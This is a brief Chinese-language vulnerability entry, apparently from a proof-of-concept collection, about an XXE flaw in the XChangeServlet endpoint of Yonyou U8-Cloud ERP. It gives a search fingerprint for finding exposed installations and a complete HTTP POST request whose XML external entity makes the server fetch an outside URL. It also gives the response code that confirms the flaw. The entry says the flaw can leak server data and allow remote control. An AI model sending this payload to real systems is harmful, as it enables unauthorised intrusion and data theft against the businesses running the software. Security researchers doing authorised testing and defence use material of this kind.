﻿# 用友U8-Cloud XChangeServlet XXE漏洞

> 更新时间：2024-05-10

> 漏洞编号：

> 漏洞说明：用友U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。该系统/service/XChangeServlet接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器数据泄露以及被远控。

> 漏洞特征：app="用友-U8-Cloud"

> 验证脚本：HTTP

```
POST /service/XChangeServlet HTTP/1.1
Content-Type: text/xml
Connection: close
 
<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://www.baidu.com">]><r><a>&xxe;</a ></r>

```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友U8-Cloud XChangeServlet XXE漏洞.poc

